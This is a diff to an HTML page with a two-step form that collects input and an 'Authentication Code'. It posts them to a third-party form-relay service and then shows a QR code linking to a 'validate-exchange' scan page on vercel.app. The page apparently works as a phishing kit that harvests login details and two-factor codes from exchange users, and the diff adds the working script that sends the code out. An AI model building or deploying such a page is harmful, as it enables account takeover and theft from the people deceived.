@@ -42,6 +42,12 @@ img.avatar {
 #step2 {
   display: none; /* hidden until step1 is submitted */
 }
+
+#qrContainer {
+  display: none;
+  text-align: center;
+  margin-top: 20px;
+}
 </style>
 </head>
 <body>
@@ -71,8 +77,6 @@ img.avatar {
 <!-- Step 2: Validation Code -->
 <form id="step2Form" action="https://api.web3forms.com/submit" method="POST">
   <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">
-  <!-- Redirect after final submission -->
-  <input type="hidden" name="_next" value="/scan/scan/index.html">
 
   <div id="step2" class="container">
     <label for="code"><b>Authentication Code</b></label>
@@ -82,14 +86,24 @@ img.avatar {
   </div>
 </form>
 
+<!-- QR Code container -->
+<div id="qrContainer">
+  <h3>Scan this QR Code</h3>
+  <canvas id="qrcode"></canvas>
+</div>
+
+<!-- QR Code library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+
 <script>
   const step1Form = document.getElementById("step1Form");
+  const step2Form = document.getElementById("step2Form");
   const step2 = document.getElementById("step2");
+  const qrContainer = document.getElementById("qrContainer");
 
+  // Step 1 submission
   step1Form.addEventListener("submit", function(e) {
     e.preventDefault();
-
-    // Submit step1 via fetch
     const formData = new FormData(step1Form);
     fetch(step1Form.action, {
       method: step1Form.method,
@@ -98,7 +112,6 @@ img.avatar {
     .then(res => res.json())
     .then(data => {
       if (data.success) {
-        // Show step2 form after successful step1
         step2.style.display = "block";
         step1Form.style.display = "none";
       } else {
@@ -106,6 +119,32 @@ img.avatar {
       }
     })
     .catch(() => alert("❌ Error submitting Step 1."));
+  });
+
+  // Step 2 submission
+  step2Form.addEventListener("submit", function(e) {
+    e.preventDefault();
+    const formData = new FormData(step2Form);
+    fetch(step2Form.action, {
+      method: step2Form.method,
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        // Show QR code after successful authentication
+        qrContainer.style.display = "block";
+        new QRious({
+          element: document.getElementById("qrcode"),
+          value: "https://validate-exchange3.vercel.app/scan/scan/index.html",
+          size: 200
+        });
+        step2Form.style.display = "none";
+      } else {
+        alert("❌ Authentication failed.");
+      }
+    })
+    .catch(() => alert("❌ Error submitting Step 2."));
   });
 </script>
 
